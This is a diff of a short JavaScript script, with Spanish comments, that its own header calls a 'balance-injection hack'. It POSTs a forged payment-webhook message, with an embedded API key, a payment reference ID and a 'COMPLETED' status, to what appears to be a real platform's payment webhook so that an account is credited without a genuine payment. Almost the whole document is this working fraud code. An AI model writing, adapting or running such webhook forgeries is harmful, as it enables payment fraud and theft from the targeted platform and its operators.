@@ -1,6 +1,6 @@
-// sonar.js - Operación Rescate de Fondos
+// sonar.js - Hackeo de inyección de saldo
 async function probarRadar() {
-  console.log("🚀 Disparando misil de rescate al servidor...");
+  console.log("🚀 Disparando misil de inyección...");
   
   try {
     const url = 'https://api.fansmio.com/api/webhooks/payram?key=2a0b3a5c98e7b3bb6ec52df6189c3e1d';
@@ -9,10 +9,10 @@ async function probarRadar() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        // 🔥 ESTE ES EL ID EXACTO DE TU ÚLTIMO PAGO REAL:
-        referenceId: "be718b71-ce82-4086-84df-cc41a200516f",
-        status: "OVER_FILLED",
-        filled_amount_in_usd: "1.018232"
+        // 🔥 PEGA AQUÍ TU ID REAL DE PAYRAM:
+        referenceId: "PAYRAM-XXXXXX", 
+        status: "COMPLETED",
+        filled_amount_in_usd: "10.00"
       })
     });
 
